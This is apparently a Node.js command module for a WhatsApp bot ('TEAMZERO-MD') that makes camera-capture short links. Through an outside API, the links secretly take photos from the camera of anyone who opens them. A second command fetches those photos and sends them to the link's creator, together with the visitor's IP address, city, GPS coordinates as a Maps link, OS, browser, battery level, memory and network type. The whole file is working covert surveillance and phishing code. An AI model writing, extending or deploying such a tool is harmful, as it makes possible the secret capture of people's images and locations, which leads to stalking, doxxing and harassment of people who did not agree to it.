const config = require('../../../config');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// ── Send one capture to WhatsApp ──
async function sendCaptureToWhatsApp(sock, to, log, phoneNumber) {
  try {
    const location = log.city || log.location_name || 'Unknown';
    const time = new Date(log.created_at).toLocaleString('en-PK', {
      day:'2-digit', month:'short', year:'numeric',
      hour:'2-digit', minute:'2-digit', second:'2-digit'
    });
    const shortCode = log.short_code || 'N/A';
    const ip = log.ip_address || 'Unknown';
    const os = log.os || log.device_type || 'Unknown';
    const browser = log.browser || 'Unknown';
    const battery = log.battery_level ? Math.round(log.battery_level*100)+'%' : 'N/A';
    const charging = log.is_charging ? '⚡ Charging' : '🔋 Not Charging';
    const memory = log.device_memory ? log.device_memory+' GB' : 'N/A';
    const network = log.network_type || 'N/A';
    const lat = log.latitude || null;
    const lng = log.longitude || null;

    let msgText = `╭━━❰📸 𝘾𝘼𝙋𝙏𝙐𝙍𝙀 | 𝐓𝐄𝐀𝐌𝐙𝐄𝐑𝐎-𝐌𝐃 ❱━━╮\n` +
                  `┃ 🔗 𝙻𝚒𝚗𝚔 : ${shortCode}\n` +
                  `┃ 📱 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : +${phoneNumber}\n` +
                  `┃ 🕐 ${time}\n` +
                  `┃ ━━━━━━━━━━━━━━━━━━\n` +
                  `┃ 🌐 𝚅𝚒𝚜𝚒𝚝𝚘𝚛 𝙸𝚗𝚏𝚘 :\n` +
                  `┃ • 𝙸𝙿 : ${ip}\n` +
                  `┃ • 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 : ${location}\n` +
                  `┃ • 𝙾𝚂 : ${os}\n` +
                  `┃ • 𝙱𝚛𝚘𝚠𝚜𝚎𝚛 : ${browser}\n` +
                  `┃ ━━━━━━━━━━━━━━━━━━\n` +
                  `┃ 📱 𝙳𝚎𝚟𝚒𝚌𝚎 :\n` +
                  `┃ • 𝙱𝚊𝚝𝚝𝚎𝚛𝚢 : ${battery} ${charging}\n` +
                  `┃ • 𝙼𝚎𝚖𝚘𝚛𝚢 : ${memory}\n` +
                  `┃ • 𝙽𝚎𝚝𝚠𝚘𝚛𝚔 : ${network}\n` +
                  `┃ ━━━━━━━━━━━━━━━━━━\n` +
                  `┃  ♛ 𝐔𝐒𝐌𝐀𝐍 𝐗 𝐒𝐇𝐀𝐇𝐘𝐀𝐍 🫀 ♛\n` +
                  `╰━━━━━━━━━━━━━━━━━━━━━━╯`;

    if (lat && lng) {
      msgText += `\n📍 𝙻𝚒𝚟𝚎 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 : https://www.google.com/maps?q=${lat},${lng}`;
    }

    if (log.captured_image) {
      try {
        const imgRes = await axios.get(log.captured_image, { responseType:'arraybuffer', timeout:15000 });
        await sock.sendMessage(to, { image: Buffer.from(imgRes.data), caption: msgText });
      } catch {
        await sock.sendMessage(to, { text: msgText });
      }
    } else {
      await sock.sendMessage(to, { text: msgText });
    }
  } catch (err) {
    console.error('[camera] sendCapture error:', err);
    await sock.sendMessage(to, { text: '📸 𝙲𝚊𝚙𝚝𝚞𝚛𝚎 𝚏𝚘𝚞𝚗𝚍 𝚋𝚞𝚝 𝚌𝚘𝚞𝚕𝚍 𝚗𝚘𝚝 𝚏𝚘𝚛𝚖𝚊𝚝 𝚙𝚛𝚘𝚙𝚎𝚛𝚕𝚢.' });
  }
}

// ── Fetch captures from API ──
async function fetchCaptures(sock, from, phoneNumber, sendAll = false) {
  const apiUrl = `https://saqibveo1.vercel.app/api/shorten?phoneNumber=${phoneNumber}`;
  try {
    const res = await axios.get(apiUrl, { timeout: 15000 });
    if (!res.data?.logs?.length) {
      await sock.sendMessage(from, { text: `╭━━❰📭 𝙴𝙼𝙿𝚃𝚈 | 𝐓𝐄𝐀𝐌𝐙𝐄𝐑𝐎-𝐌𝐃 ❱━━╮\n┃\n┃ 📭 𝙽𝚘 𝚌𝚊𝚙𝚝𝚞𝚛𝚎𝚜 𝚏𝚘𝚞𝚗𝚍 𝚏𝚘𝚛 +${phoneNumber}\n┃\n┃ ♛ 𝐔𝐒𝐌𝐀𝐍 𝐗 𝐒𝐇𝐀𝐇𝐘𝐀𝐍 🫀 ♛\n╰━━━━━━━━━━━━━━━━━━━━━━╯` });
      return;
    }
    const logs = res.data.logs;
    const toSend = sendAll ? logs.slice(0, 10) : [logs[0]];
    for (let i = 0; i < toSend.length; i++) {
      await sendCaptureToWhatsApp(sock, from, toSend[i], phoneNumber);
      if (i < toSend.length - 1) await new Promise(r => setTimeout(r, 1000));
    }
    if (sendAll && logs.length > 10) {
      await sock.sendMessage(from, { text: `📊 ${logs.length - 10} 𝚖𝚘𝚛𝚎 𝚌𝚊𝚙𝚝𝚞𝚛𝚎𝚜. 𝚄𝚜𝚎 .camera check 𝚏𝚘𝚛 𝚕𝚊𝚝𝚎𝚜𝚝.` });
    } else if (!sendAll && logs.length > 1) {
      await sock.sendMessage(from, { text: `📊 𝚃𝚘𝚝𝚊𝚕 ${logs.length} 𝚌𝚊𝚙𝚝𝚞𝚛𝚎𝚜. 𝚄𝚜𝚎 .camera check all 𝚏𝚘𝚛 𝚊𝚕𝚕.` });
    }
  } catch (err) {
    throw new Error('Failed to fetch captures: ' + (err.response?.data?.message || err.message));
  }
}

// ── Main command ──
module.exports = {
  name: 'camera',
  aliases: ['cam', 'cameracapture', 'camlink'],
  category: 'utility',
  description: '📸 𝙲𝚛𝚎𝚊𝚝𝚎 𝚌𝚊𝚖𝚎𝚛𝚊‑𝚌𝚊𝚙𝚝𝚞𝚛𝚎 𝚜𝚑𝚘𝚛𝚝𝚕𝚒𝚗𝚔 𝚘𝚛 𝚌𝚑𝚎𝚌𝚔 𝚌𝚊𝚙𝚝𝚞𝚛𝚎𝚜 (𝐔𝐒𝐌𝐀𝐍 𝐗 𝐒𝐇𝐀𝐇𝐘𝐀𝐍 🫀 | 𝐓𝐄𝐀𝐌𝐙𝐄𝐑𝐎-𝐌𝐃)',
  usage: `${config.prefix}camera <url>\n${config.prefix}camera check [all]`,

  async execute(sock, msg, args, extra) {
    const { reply, react, sender, from } = extra;
    const creatorPhone = sender.split('@')[0];

    try {
      if (!args.length) {
        return reply(
          `╭━━❰📸 𝙲𝙰𝙼𝙴𝚁𝙰 | 𝐓𝐄𝐀𝐌𝐙𝐄𝐑𝐎-𝐌𝐃 ❱━━╮\n` +
          `┃\n` +
          `┃ 𝙲𝚛𝚎𝚊𝚝𝚎 𝙻𝚒𝚗𝚔 :\n` +
          `┃ ${config.prefix}camera <url>\n` +
          `┃\n` +
          `┃ 𝙲𝚑𝚎𝚌𝚔 𝙲𝚊𝚙𝚝𝚞𝚛𝚎𝚜 :\n` +
          `┃ ${config.prefix}camera check\n` +
          `┃ ${config.prefix}camera check all\n` +
          `┃\n` +
          `┃ ♛ 𝐔𝐒𝐌𝐀𝐍 𝐗 𝐒𝐇𝐀𝐇𝐘𝐀𝐍 🫀 ♛\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━━╯`
        );
      }

      // check captures
      if (args[0].toLowerCase() === 'check') {
        const showAll = args[1]?.toLowerCase() === 'all';
        await react('📸');
        await reply('🔍 𝙵𝚎𝚝𝚌𝚑𝚒𝚗𝚐 𝚌𝚊𝚙𝚝𝚞𝚛𝚎𝚜...');
        await fetchCaptures(sock, from, creatorPhone, showAll);
        await react('✅');
        return;
      }

      // create shortlink
      let longUrl = args[0];
      if (!/^https?:\/\//i.test(longUrl)) longUrl = 'https://' + longUrl;

      const payload = {
        longUrl,
        phoneNumber: creatorPhone,
        captureCamera: true,
        captureLocation: false
      };

      const response = await axios.post('https://saqibveo1.vercel.app/api/shorten', payload, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 15000
      });

      if (!response.data?.success) throw new Error(response.data?.message || 'API failed');

      const shortUrl = response.data.shortUrl;

      await reply(
        `╭━━❰✅ 𝙻𝙸𝙽𝙺 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 | 𝐓𝐄𝐀𝐌𝐙𝐄𝐑𝐎-𝐌𝐃 ❱━━╮\n` +
        `┃\n┃ 🔗 ${shortUrl}\n┃ 📱 +${creatorPhone}\n` +
        `┃ 📸 𝙲𝚊𝚖𝚎𝚛𝚊 𝙲𝚊𝚙𝚝𝚞𝚛𝚎 𝙰𝚌𝚝𝚒𝚟𝚎\n` +
        `┃  For Results Type 👇\n` +
        `┃ ${config.prefix}camera check\n` +
        `┃\n┃ ♛ 𝐔𝐒𝐌𝐀𝐍 𝐗 𝐒𝐇𝐀𝐇𝐘𝐀𝐍 🫀 ♛\n` +
        `╰━━━━━━━━━━━━━━━━━━━━━━╯`
      );
      await react('✅');

      // save to local DB
      try {
        const dbPath = path.join(__dirname, '../../database/smartlinks.json');
        let data = { links: [] };
        if (fs.existsSync(dbPath)) data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        data.links.unshift({
          phone: creatorPhone, shortUrl, longUrl,
          camera: true, createdAt: new Date().toISOString()
        });
        if (data.links.length > 100) data.links = data.links.slice(0, 100);
        fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
      } catch {}

    } catch (error) {
      console.error('[camera]', error);
      let errMsg = error.response?.data?.message || error.message;
      if (error.code === 'ECONNREFUSED') errMsg = '𝙰𝙿𝙸 𝚞𝚗𝚛𝚎𝚊𝚌𝚑𝚊𝚋𝚕𝚎.';
      await reply(`❌ ${errMsg}`);
      await react('❌');
    }
  }
};
